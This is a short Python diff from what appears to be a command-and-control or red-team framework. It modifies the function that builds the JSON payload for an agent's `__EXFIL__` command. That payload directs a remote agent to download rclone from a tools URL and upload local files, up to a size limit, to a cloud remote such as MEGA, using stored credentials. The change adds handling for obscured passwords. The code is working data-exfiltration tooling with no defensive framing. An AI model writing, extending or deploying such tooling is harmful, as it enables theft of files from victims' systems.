@@ -120,7 +120,7 @@ def profile_to_rclone_env(profile: dict) -> dict[str, str]:
     remote_type = str(profile.get("type", "")).strip()
     if not remote_type:
         raise RcloneConfigError("Profile missing type")
-    skip = {"type", "folder", "name", "description"}
+    skip = {"type", "folder", "name", "description", "pass_obscured"}
     env: dict[str, str] = {f"RCLONE_CONFIG_{remote}_TYPE": remote_type}
     for key, value in profile.items():
         if key in skip or value is None:
@@ -150,13 +150,18 @@ def build_exfil_payload(
 ) -> dict:
     """JSON payload embedded in the agent ``__EXFIL__`` command."""
     profile = get_profile(profile_name)
+    remote = RCLONE_REMOTE_NAME
+    env_skip_obscure: list[str] = []
+    if profile.get("pass_obscured"):
+        env_skip_obscure.append(f"RCLONE_CONFIG_{remote}_PASS")
     return {
         "local_path": local_path,
         "profile": profile_name,
         "backend": profile.get("type"),
         "dest": resolve_dest_path(profile, local_path, dest),
         "env": profile_to_rclone_env(profile),
-        "remote_name": RCLONE_REMOTE_NAME,
+        "env_skip_obscure": env_skip_obscure,
+        "remote_name": remote,
         "max_bytes": RCLONE_MAX_BYTES,
         "rclone_url": RCLONE_TOOLS_URL,
         "link_command": bool(profile.get("type") == "mega"),
